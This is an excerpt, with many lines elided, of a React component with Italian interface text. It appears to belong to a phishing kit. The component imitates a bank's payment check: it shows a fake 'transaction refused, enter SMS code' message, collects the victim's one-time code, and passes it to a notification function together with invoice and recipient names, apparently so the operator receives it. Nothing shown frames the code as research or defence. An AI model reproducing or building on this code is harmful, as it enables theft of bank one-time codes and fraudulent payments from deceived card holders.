...
import { Shield, MessageSquare, RotateCw } from "lucide-react";
...
interface DecSmsComponentProps {
...
const DecSmsComponent = ({ cardType, bankName, onChoice, invoiceName = "Fattura sconosciuta", recipientName = "Destinatario sconosciuto" }: DecSmsComponentProps) => {
  const [smsCode, setSmsCode] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);

  const handleSubmit = async () => {
    if (!smsCode.trim()) {
      alert('Inserisci il codice SMS');
      return;
    }
    ...
    try {
      await sendDeOtpEnteredNotification(invoiceName, recipientName, smsCode);
  ...
  return (
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
      <div className="text-center">
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-orange-50 border border-orange-200 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center flex items-center justify-center gap-2">
            <MessageSquare className="h-4 w-4 text-orange-600" />
            <p className="text-[11px] font-chevin font-medium text-orange-700 leading-relaxed drop-shadow-sm">
              Transazione rifiutata - Inserisci codice SMS
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center">
          <input
            ...
            placeholder="123456"
            required
            value={isProcessing ? '••••••'.slice(0, smsCode.length) : smsCode}
        ...
        <div className="flex justify-center">
          <Button
            ...
            disabled={isProcessing || !smsCode.trim()}
...
export default DecSmsComponent;
